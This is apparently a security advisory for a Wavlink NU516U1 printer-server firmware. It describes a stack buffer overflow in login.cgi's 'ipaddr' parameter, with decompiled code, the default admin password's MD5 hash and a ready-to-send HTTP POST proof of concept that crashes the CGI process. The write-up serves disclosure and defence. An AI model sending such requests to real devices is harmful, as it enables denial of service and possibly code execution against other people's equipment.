# Wavlink NU516U1 (V251208) login.cgi Component sub_401A10 Function Stack Buffer Overflow Vulnerability via "ipaddr" Parameter

**Overview**

- **Vendor:** Wavlink
- **Product:** NU516U1
- **Version:** WAVLINK-NU516U1-A-WO-20251208-BYFM (V251208)
- **Type:** Stack Buffer Overflow
- **Product Usage:** USB Printer Server / Wireless Router
- **Firmware Download Link:** https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A
- **Default Login Password:** admin

### Basic Vulnerability Information

- **Vulnerable Function:** `sub_401A10` (handles the `sys_login1` interface)
- **Vulnerability Point:** `sprintf(v18, "web 2860 sys addUser \"%s\"", v4);`
- **Trigger Parameter:** `ipaddr` (corresponds to `v4` in the code)
- **Prerequisites:** The submitted `password` parameter must match the MD5 hash of the administrator password, and a valid Session Cookie is required.

### Vulnerability Description

In the Wavlink NU516U1 firmware version V251208, although the vendor attempted to fix a command injection vulnerability from previous versions (by introducing the `sub_4059BC` filter function), the `sub_401A10` function within the `/cgi-bin/login.cgi` component still contains a severe stack buffer overflow vulnerability.

Inside the function, a fixed-size buffer `v18` of 128 bytes is defined on the stack. After the MD5 password verification passes, the program calls `sub_4059BC` to filter characters in the user-input `ipaddr` parameter. However, this filter function only checks for illegal special characters (such as `;`, `|`, etc.) and completely fails to check the length of the input string.

An attacker can construct an overly long string composed of legal characters (such as the letter 'A') to bypass the filter. The program then uses the `sprintf` function to concatenate this parameter directly into the `v18` buffer. Since `sprintf` does not limit the length of the written data, when the length of `ipaddr` exceeds approximately 106 bytes, an out-of-bounds write occurs, overwriting adjacent local variables on the stack and the function's Return Address ($ra). This causes the CGI process to crash (Segmentation Fault), resulting in a Denial of Service (DoS), and under specific conditions, could potentially be exploited to achieve Remote Code Execution (RCE).

### Vulnerability Details

**Affected Code Snippet (`sub_401A10`):**

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1770743146714-48db6b67-e913-4550-8b03-ebb6c4e5b3be.png?x-oss-process=image%2Fformat%2Cwebp)

```
int __fastcall sub_401A10(int a1)
{
  // ... Variable declarations ...
  _BYTE v18[128]; // [sp+120h] [-FCh] BYREF  <-- Vulnerable buffer, size 128 bytes
  
  // ... Get parameter ...
  v2 = sub_404158("ipaddr", a1, 0);
  v4 = (const char *)strdup(v2); // v4 is user input, length unrestricted
  
  // ... After password verification passes ...
  
  // Although character filtering was added, length is not checked
  if ( sub_4059BC(v4) != 1 ) 
  {
    memset(v18, 0, sizeof(v18));
    v18[0] = 48;
    
    // Vulnerability Point: Concatenate v4 into v18
    // Fixed prefix "web 2860 sys addUser \"" occupies approx 22 bytes
    // Remaining space approx 106 bytes. Overflow occurs if v4 exceeds this.
    sprintf(v18, "web 2860 sys addUser \"%s\"", v4);
    
    system(v18); // Stack is corrupted at this point
    // ...
  }
  // ...
}
```

**Memory Layout and Overflow Path:**

- **Buffer `v18`:** Located at stack offset `$sp + 0x120`, size 128 bytes.
- **Filter Failure:** `sub_4059BC` only filters characters based on a blacklist. The input Payload consists entirely of 'A's, which are not in the blacklist, so it successfully enters the `sprintf` logic.
- **Crash Confirmation:** After inputting an overly long string, `sprintf` overwrites towards higher addresses, destroying the stack frame structure, causing the function to jump to an illegal address upon return.

### EXP (Exploit / PoC)

**Exploitation Conditions:**

1. Knowledge of the administrator password's MD5 hash (the MD5 for the default 'admin' is `21232f297a57a5a743894a0e4a801fc3`).
2. Ability to send POST requests to `/cgi-bin/login.cgi`, requiring a valid Cookie.

**Constructed Packet (DoS):**

Send a POST request containing a large number of 'A' characters in the `ipaddr` parameter.

```
POST /cgi-bin/login.cgi HTTP/1.1
Host: usblogin.link
Content-Length: 292
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usblogin.link
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usblogin.link/html/firewall.shtml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=1021829017
Connection: close

page=sys_login1&password=21232f297a57a5a743894a0e4a801fc3&ipaddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Verification Results:**

- **Normal Request:** When sending a shorter Payload, the server returns `HTTP/1.1 200 OK`.

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1770742777266-2e83892a-c13b-436f-90eb-290dcaa93739.png?x-oss-process=image%2Fformat%2Cwebp)

- **Overflow Request:** After sending the packet containing the massive amount of 'A's described above, the server returns `HTTP/1.1 500 Internal Server Error` (as shown in the verification screenshot). This confirms that the CGI process crashed due to a Segmentation Fault, verifying the existence of the Stack Buffer Overflow vulnerability.

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1770742759591-99e333d0-13c3-4f12-bc0d-bfa8c206841b.png?x-oss-process=image%2Fformat%2Cwebp)

